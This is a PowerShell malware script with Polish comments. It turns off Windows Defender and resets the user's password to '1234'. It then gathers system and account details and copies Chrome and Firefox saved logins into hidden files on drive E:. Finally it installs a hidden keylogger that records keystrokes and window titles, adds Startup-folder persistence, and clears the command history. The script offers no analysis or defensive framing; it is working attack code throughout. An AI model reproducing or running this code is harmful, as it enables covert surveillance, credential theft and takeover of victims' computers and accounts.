# ================ CICHY START ================
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ================ WYŁĄCZENIE DEFENDERA ================
Set-MpPreference -DisableRealtimeMonitoring $true -Force
Set-MpPreference -DisableBehaviorMonitoring $true -Force
Set-MpPreference -DisableScriptScanning $true -Force
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled

# ================ ZMIANA HASŁA ================
$username = $env:USERNAME
$newPassword = ConvertTo-SecureString "1234" -AsPlainText -Force
$computer = [ADSI]"WinNT://$env:COMPUTERNAME"
$user = $computer.Children.Find($username)
$user.Invoke("SetPassword", "1234")
$user.CommitChanges()

# ================ ZBIERANIE DANYCH SYSTEMOWYCH ================
$systemFile = "E:\SystemCache.dat"
$systemData = @{
    Hostname = $env:COMPUTERNAME
    User = $env:USERNAME
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    CPU = (Get-WmiObject Win32_Processor).Name
    RAM = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    Antivirus = (Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct).displayName
    Network = Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address
    Users = Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled, Status
} | ConvertTo-Json -Depth 5

$systemData | Out-File $systemFile -Encoding UTF8
attrib +s +h +r $systemFile

# ================ PRZEGLĄDARKI I HASŁA ================
function Get-BrowserData {
    $data = @{}
    
    # Chrome
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromePath) {
            $tempCopy = "$env:TEMP\chrome_data"
            Copy-Item $chromePath $tempCopy -Force
            
            $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
            $connection.ConnectionString = "Data Source=$tempCopy;"
            $connection.Open()
            
            $command = $connection.CreateCommand()
            $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $adapter = New-Object -TypeName System.Data.SQLite.SQLiteDataAdapter $command
            $dataset = New-Object -TypeName System.Data.DataSet
            $adapter.Fill($dataset) | Out-Null
            
            $chromeData = @()
            foreach ($row in $dataset.Tables[0].Rows) {
                $chromeData += @{
                    URL = $row.origin_url
                    Username = $row.username_value
                    Password = "ENCRYPTED"  # Wymaga dodatkowego dekodowania
                }
            }
            $data.Chrome = $chromeData
            $connection.Close()
            Remove-Item $tempCopy -Force
        }
    } catch {}
    
    # Firefox
    try {
        $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
        if (Test-Path $firefoxPath) {
            $profile = Get-ChildItem $firefoxPath -Directory | Where-Object { 
                $_.Name -match "default-release" 
            } | Select-Object -First 1
            
            $loginsJson = Join-Path $profile.FullName "logins.json"
            if (Test-Path $loginsJson) {
                $firefoxData = Get-Content $loginsJson | ConvertFrom-Json
                $data.Firefox = $firefoxData.logins
            }
        }
    } catch {}
    
    return $data
}

$browserFile = "E:\BrowserData.dat"
$browserData = Get-BrowserData | ConvertTo-Json -Depth 5
$browserData | Out-File $browserFile -Encoding UTF8
attrib +s +h +r $browserFile

# ================ KEYLOGGER ================
$keyloggerFile = "E:\Keylogger.ps1"
$keylogOutput = "E:\Keylog.dat"

$keyloggerScript = @'
$signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
Add-Type -MemberDefinition $signature -Name Keyboard -Namespace KeyLogger

$logPath = "E:\Keylog.dat"
$lastWindow = ""

while($true) {
    Start-Sleep -Milliseconds 40
    
    # Śledzenie aktywnego okna
    $process = Get-Process | Where-Object { $_.MainWindowTitle -ne "" } | 
               Sort-Object StartTime -Descending | Select-Object -First 1
    $currentWindow = $process.MainWindowTitle
    
    if ($currentWindow -ne $lastWindow) {
        $lastWindow = $currentWindow
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "`n[$timestamp] Active: $currentWindow`n" | Out-File $logPath -Append -Encoding UTF8
    }
    
    # Rejestracja klawiszy
    for ($asc = 8; $asc -le 254; $asc++) {
        $state = [KeyLogger.Keyboard]::GetAsyncKeyState($asc)
        if ($state -eq -32767) {
            $key = switch ($asc) {
                8 { "[BACKSPACE]" }
                9 { "[TAB]" }
                13 { "`n" }
                27 { "[ESC]" }
                32 { " " }
                default { [char]$asc }
            }
            $key | Out-File $logPath -Append -Encoding UTF8
        }
    }
}
'@

$keyloggerScript | Out-File $keyloggerFile -Encoding UTF8
attrib +s +h +r $keyloggerFile
attrib +s +h +r $keylogOutput

# Uruchom keyloggera w ukryciu
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$keyloggerFile`""

# ================ PERSYSTENCJA ================
$persistenceFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemInit.vbs"
$persistenceScript = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""E:\Keylogger.ps1""", 0, False
"@

$persistenceScript | Out-File $persistenceFile -Encoding ASCII

# ================ CZYSZCZENIE ================
Remove-Item "$env:TEMP\run.vbs" -Force -ErrorAction SilentlyContinue
Clear-History
